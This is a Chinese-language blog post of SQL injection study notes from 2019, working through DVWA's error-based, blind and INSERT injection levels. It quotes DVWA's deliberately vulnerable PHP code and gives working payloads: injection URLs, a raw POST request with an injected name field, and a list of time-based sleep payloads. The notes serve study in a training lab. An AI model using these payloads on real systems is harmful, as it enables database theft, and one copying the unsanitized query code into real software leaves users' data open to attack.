---
title: sql注入学习笔记
url: 400.html
id: 400
comments: false
categories:
  - 安全/代码
date: 2019-02-02 15:54:26
tags:
---

sql注入学习
=======

mysql数据库名:dvwa  
database(),user()

### mysql报错注入

    <?php
    
    if( isset( $_REQUEST[ 'Submit' ] ) ) {
        // Get input
        $id = $_REQUEST[ 'id' ];
    
        // Check database
        $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
        $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
    
        // Get results
        $num = mysql_numrows( $result );
        $i   = 0;
        while( $i < $num ) {
            // Get values
            $first = mysql_result( $result, $i, "first_name" );
            $last  = mysql_result( $result, $i, "last_name" );
    
            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    
            // Increase loop count
            $i++;
        }
    
        mysql_close();
    }
    
    ?> 
    

判断是否为sql:  
正常url:http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a&Submit=Submit#  
单引号判断:http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a%27&Submit=Submit# 页面异常  
![iByRDx.png](https://s1.ax1x.com/2018/10/21/iByRDx.png) or 1=1-- http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a%27or%201=1--%20&Submit=Submit#

> $query = "SELECT first\_name, last\_name FROM users WHERE user\_id = '$id' or 1=1'--;"; 遍历出first\_name, last_name字段所有数据  
> 判断表内共有列数  
> http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a'order by 2-- &Submit=Submit#  
> 出数据库用户名  
> http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a%27union%20select%201,user()--%20&Submit=Submit#  
> $query = "SELECT first\_name, last\_name FROM users WHERE user_id = '$id' union select 1,user()--;'";

![iBy2K1.png](https://s1.ax1x.com/2018/10/21/iBy2K1.png)
--------------------------------------------------------

### mysql盲注

    <?php
    
    if( isset( $_GET[ 'Submit' ] ) ) {
        // Get input
        $id = $_GET[ 'id' ];
    
        // Check database
        $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
        $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors
    
        // Get results
        $num = @mysql_numrows( $result ); // The '@' character suppresses errors
        if( $num > 0 ) {
            // Feedback for end user
            echo '<pre>User ID exists in the database.</pre>';
        }
        else {
            // User wasn't found, so the page wasn't!
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
    
            // Feedback for end user
            echo '<pre>User ID is MISSING from the database.</pre>';
        }
    
        mysql_close();
    }
    
    ?> 
    

数据库名长度: http://guimaizivul.qq.com/vulnerabilities/sqli_blind/ ?id=a' or length((select database()))>=3 -- &Submit=Submit#  
判读数据库名:http://guimaizivul.qq.com/vulnerabilities/sqli_blind/ ?id=a' or ascii(mid(database(),2,1))>76 -- &Submit=Submit#  
http://guimaizivul.qq.com/vulnerabilities/sqli_blind/ ?id=a' or ascii(mid(database(),1,1))=1-- &Submit=Submit#

![iBXVj1.png](https://s1.ax1x.com/2018/10/21/iBXVj1.png)
--------------------------------------------------------

### mysql INSERT注入

    <?php
    
    if( isset( $_POST[ 'btnSign' ] ) ) {
        // Get input
        $message = trim( $_POST[ 'mtxMessage' ] );
        $name    = trim( $_POST[ 'txtName' ] );
        // Sanitize message input
        $message = stripslashes( $message );
        $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        /*
        // Sanitize name input
        $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        */
        // Update database
        $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
        echo $query ."<hr>";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
        //mysql_close();
    }
    
    ?>
    

    POST /DVWA/vulnerabilities/xss_s/ HTTP/1.1
    Host: 192.168.0.107
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Referer: http://192.168.0.107/DVWA/vulnerabilities/xss_s/
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 87
    Cookie: security=low; PHPSESSID=jmokhe5ce35gqiq2qvbtt516j2
    Connection: close
    Upgrade-Insecure-Requests: 1
    
    txtName=1' |(select hex(database())));#&mtxMessage=get_datan_ame&btnSign=Sign+Guestbook
    

![iDKBiF.png](https://s1.ax1x.com/2018/10/22/iDKBiF.png) ![iDKDG4.png](https://s1.ax1x.com/2018/10/22/iDKDG4.png) txtName参数处注入 hex解码6476761 为数据库名dvwa

payload: * 1'|(select hex(database()))) * 1'| sleep(6))# * or sleep(6)# * and sleep(5)# * ' AND SLEEP(5) AND 'DzvZ'='DzvZ * '%2Bsleep(5)%2B'12 * %2bsleep(5)

* * *

参考资料:  
[ASCII码对照表](http://ascii.911cha.com/)  
[Sqli-LABS通关笔录-5\[SQL布尔型盲注\]](https://www.cnblogs.com/xishaonian/p/6103505.html)  
[新手渗透测试训练营——SQL注入](http://www.freebuf.com/column/184285.html)  
[Insert和Update型SQL注入的实践之旅](http://blackwolfsec.cc/2018/07/30/sql_update_insert/)